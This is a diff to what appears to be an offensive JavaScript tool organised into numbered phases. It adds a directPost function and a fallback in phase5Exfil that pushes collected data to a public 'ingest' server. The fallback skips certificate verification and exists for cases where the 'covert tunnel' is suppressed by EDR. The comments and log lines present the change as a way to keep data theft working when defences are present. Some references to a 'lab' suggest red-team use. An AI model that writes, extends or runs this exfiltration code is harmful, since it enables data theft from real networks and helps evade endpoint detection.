@@ -844,6 +844,35 @@ function directGet(url) {
   });
 }
 
+// direct egress of an already-built body: last resort when the covert tunnel is
+// suppressed (EDR present) and no forward proxy is reachable. Matches directGet's
+// cert handling — the ingest listener ships a self-signed leaf.
+function directPost(url, bodyBuf, contentType) {
+  return new Promise((resolve, reject) => {
+    const u = new URL(url);
+    const lib = u.protocol === 'https:' ? https : http;
+    const req = lib.request(url, {
+      method: 'POST',
+      timeout: 60000,
+      rejectUnauthorized: false,
+      headers: {
+        'Content-Type': contentType || 'application/json',
+        'Content-Length': bodyBuf.length,
+        'Accept': '*/*',
+        'Connection': 'close'
+      }
+    }, (res) => {
+      const chunks = [];
+      res.on('data', (c) => chunks.push(c));
+      res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks) }));
+    });
+    req.on('timeout', () => req.destroy(new Error('timeout')));
+    req.on('error', reject);
+    req.write(bodyBuf);
+    req.end();
+  });
+}
+
 async function phase4Fetch(cfg, state, tunnelUp) {
   log('[phase4/6] FETCH: datasets + staged payloads');
   if (process.env.LAB_SKIP_DATASETS === '1') {
@@ -1061,6 +1090,20 @@ async function phase5Exfil(cfg, state, env, tunnelUp) {
       log(`[-] proxy CONNECT exfil status ${res.status}`);
     } catch (e) {
       log(`[-] proxy CONNECT exfil: ${e.message}`);
+    }
+
+    // direct egress: tunnel is suppressed under EDR and the lab has no forward
+    // proxy, so push straight to the public ingest (self-signed leaf accepted).
+    try {
+      const t0 = Date.now();
+      const res = await directPost(ingestPub, bodyBuf);
+      if (res.status >= 200 && res.status < 300) {
+        log(`[+] exfil delivered direct to ${ingestPub} (${bodyBuf.length} bytes, ${Date.now() - t0}ms)`);
+        return;
+      }
+      log(`[-] direct exfil status ${res.status}`);
+    } catch (e) {
+      log(`[-] direct exfil: ${e.message}`);
     }
   } else {
     log('[-] no public ingest URL for proxy fallback');
